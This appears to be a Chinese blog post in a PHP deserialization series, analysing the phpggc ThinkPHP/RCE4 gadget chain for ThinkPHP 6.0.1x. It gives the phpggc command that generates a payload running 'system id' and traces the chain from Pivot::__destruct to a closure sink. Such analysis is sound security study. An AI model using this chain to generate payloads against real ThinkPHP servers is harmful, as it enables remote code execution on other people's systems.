---
title: phpggc thinkphp RCE4
date: 2023-06-07 22:21:31
categories:
- PHP
tags:
- Deserialization
- thinkphp
toc: true
image:
  path: /assets/images/php.png
---

> - [php-反序列化格式基础](/php/2023/06/08/php-反序列化格式基础.html)
- [php-反序列化绕过](/php/2023/06/08/php-反序列化绕过.html)
- [php-反序列化字符逃逸](/php/2023/06/08/php-反序列化字符逃逸.html)
- [php-phar-反序列化](/php/2023/06/08/php-phar-反序列化利用.html)
- [php-反序列化原生类利用](/php/2023/06/08/php-反序列化原生类利用.html)
- [phpggc-利用链分析](/php/2023/06/08/phpggc-thinkphp-利用链分析.html)
  - ThinkPHP
    - [phpggc-thinkphp-RCE1](/php/2023/06/08/phpggc-thinkphp-RCE1.html)
    - [phpggc-thinkphp-RCE2](/php/2023/06/08/phpggc-thinkphp-RCE2.html)
    - [phpggc-thinkphp-RCE3](/php/2023/06/08/phpggc-thinkphp-RCE3.html)
    - [phpggc-thinkphp-RCE4](/php/2023/06/08/phpggc-thinkphp-RCE4.html)
    - [phpggc-thinkphp-FW1](/php/2023/06/08/phpggc-thinkphp-FW1.html)
    - [phpggc-thinkphp-FW2](/php/2023/06/08/phpggc-thinkphp-FW2.html)


## RCE4
影响范围：
- thinkphp 6.0.1x

### 使用

```bash
phpggc ThinkPHP/RCE4 system id  -b -u
```


### 分析

RCE4 整个调用链较长,如下所示：
```php                                        
think\model\Pivot::__destruct()
    think\Model::__destruct()
        | $this->save();                                   
        | $this->updateData()
        | $this->checkAllowFields();
        | $this->db();
        | $this->name . $this->suffix  <-- 字符串连接
        think\model\concern\Conversion::__toString()
            | $this->toJson()
            | $this->toArray()
            | $this->getAttr()
            think\model\concern\Attribute::getValue()
                | $this->getJsonValue()
                $closure($value[$key], $value); * <----            
```
这条链的 sink 点与 RCE1 类似，通过闭包来达成 RCE，入口点有所不同，RCE1 针对的 5.1.x 版本中 Model 类并没有 __destruct 方法，而在 6.0.x 版本中 Model 自身就有 __destruct 方法.